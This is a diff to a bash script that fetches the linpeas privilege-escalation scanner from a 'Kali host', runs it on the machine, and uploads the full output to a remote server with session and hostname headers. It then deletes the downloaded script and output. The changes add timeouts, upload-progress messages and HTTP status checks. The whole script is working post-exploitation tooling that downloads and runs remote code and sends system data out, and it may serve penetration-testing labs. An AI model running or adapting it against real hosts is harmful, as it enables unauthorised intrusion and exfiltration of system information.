@@ -45,7 +45,7 @@ echo "[*] Downloading $SCAN_TYPE from Kali host..."
 if [[ $USE_WGET ]]; then
     wget -q -O "$SCRIPT_PATH" "$SCRIPT_ENDPOINT" || { echo "[!] Download failed"; exit 1; }
 else
-    curl -sSL "$SCRIPT_ENDPOINT" -o "$SCRIPT_PATH" || { echo "[!] Download failed"; exit 1; }
+    curl -sSL "$SCRIPT_ENDPOINT" -o "$SCRIPT_PATH" --max-time 30 || { echo "[!] Download failed"; exit 1; }
 fi
 
 if [[ ! -f "$SCRIPT_PATH" ]] || [[ ! -s "$SCRIPT_PATH" ]]; then
@@ -60,9 +60,10 @@ if [[ $SCAN_TYPE == "linpeas" ]]; then
     chmod +x "$SCRIPT_PATH"
     
     echo "[*] Running linpeas (this may take a few minutes)..."
+    echo "[*] Progress will be shown, but output is being captured..."
     echo ""
     
-    # Run linpeas and save output
+    # Run linpeas and save output (show progress)
     "$SCRIPT_PATH" 2>&1 | tee "$TMP_OUTPUT"
     
     # Check if output was generated
@@ -76,36 +77,45 @@ if [[ $SCAN_TYPE == "linpeas" ]]; then
     echo "[*] Scan complete. Output size: $((OUTPUT_SIZE / 1024)) KB"
     echo "[*] Transferring to Kali host..."
     
-    # Send to Kali with retry logic
+    # Send to Kali with retry logic and proper timeout
     MAX_RETRIES=3
     RETRY_COUNT=0
     
     while [[ $RETRY_COUNT -lt $MAX_RETRIES ]]; do
-        if curl -X POST \
+        echo "[*] Upload attempt $((RETRY_COUNT + 1))/$MAX_RETRIES..."
+        
+        # Use curl with explicit timeouts and write response to file
+        RESPONSE=$(curl -X POST \
             -H "X-Session-ID: $SESSION_ID" \
             -H "X-Hostname: $HOSTNAME" \
             -H "X-Scan-Type: $SCAN_TYPE" \
             -H "Content-Type: text/plain" \
             --data-binary "@$TMP_OUTPUT" \
-            --max-time 300 \
-            "$SERVER_URL/upload" 2>&1 | tee /tmp/.transfer_response.tmp | grep -q '"status":"success"'; then
-            
-            echo ""
+            --connect-timeout 10 \
+            --max-time 120 \
+            -w "\n%{http_code}" \
+            "$SERVER_URL/upload" 2>/dev/null)
+        
+        # Get HTTP status code (last line)
+        HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
+        RESPONSE_BODY=$(echo "$RESPONSE" | head -n-1)
+        
+        if [[ "$HTTP_CODE" == "200" ]]; then
             echo "[+] Transfer successful!"
             
-            # Extract and display report URL
-            REPORT_URL=$(grep -o '"report_url":"[^"]*"' /tmp/.transfer_response.tmp | cut -d'"' -f4)
+            # Try to extract report URL
+            REPORT_URL=$(echo "$RESPONSE_BODY" | grep -o '"report_url":"[^"]*"' | cut -d'"' -f4)
             if [[ -n "$REPORT_URL" ]]; then
                 echo "[+] View report at: $SERVER_URL$REPORT_URL"
             fi
             
             echo "[+] Cleaning up..."
-            rm -f "$SCRIPT_PATH" "$TMP_OUTPUT" /tmp/.transfer_response.tmp
+            rm -f "$SCRIPT_PATH" "$TMP_OUTPUT"
             echo "[+] Done!"
             exit 0
         else
             RETRY_COUNT=$((RETRY_COUNT + 1))
-            echo "[!] Transfer failed (attempt $RETRY_COUNT/$MAX_RETRIES)"
+            echo "[!] Transfer failed with HTTP code: $HTTP_CODE"
             if [[ $RETRY_COUNT -lt $MAX_RETRIES ]]; then
                 echo "[*] Retrying in 2 seconds..."
                 sleep 2
